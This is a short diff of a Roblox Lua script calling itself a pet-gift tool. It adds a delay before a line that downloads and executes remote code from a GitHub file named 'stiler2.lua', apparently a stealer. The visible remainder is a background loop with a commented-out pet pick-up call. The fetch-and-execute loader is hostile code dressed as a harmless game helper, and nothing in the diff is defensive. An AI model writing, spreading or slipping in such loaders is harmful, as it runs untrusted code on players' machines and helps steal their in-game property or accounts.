@@ -1,3 +1,5 @@
+task.wait(2)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua"))()
 
 warn("[PETGIFT] Script started")
@@ -142,4 +144,5 @@ task.spawn(function()
 		--pickUpPlacedPets()
 	end
 end)
+
 
